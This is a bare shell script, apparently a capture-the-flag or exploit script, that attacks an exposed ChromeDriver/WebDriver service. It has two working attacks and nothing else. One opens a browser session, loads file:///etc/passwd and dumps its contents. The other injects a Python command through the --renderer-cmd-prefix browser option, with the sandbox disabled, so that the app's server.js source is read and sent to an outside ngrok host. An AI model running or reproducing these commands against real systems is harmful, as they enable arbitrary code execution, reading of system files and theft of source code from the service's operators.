#!/bin/sh

session=$(curl --silent -X POST http://localhost:9515/session --data '{"capabilities": {}}' -H "Content-Type: application/json" \
  | sed 's/.*,"sessionId":"//' | sed 's/"}}//')
curl --silent "http://localhost:9515/session/${session}/url" --data '{"url": "file:///etc/passwd"}' -H "Content-Type: application/json"
curl --silent "http://localhost:9515/session/${session}/source"


curl -v http://localhost:40794/session --data "{\"desiredCapabilities\":{\"browserName\":\"chrome\",\"goog:chromeOptions\":{\"args\":[\"--no-sandbox\",\"--renderer-cmd-prefix=python2.7 -c __import__\(\'urllib\'\).urlopen\(\'http://893d10603969.ngrok.io\',open\(\'/home/user/app/server.js\'\).read\(\)\) -- \"]}}}"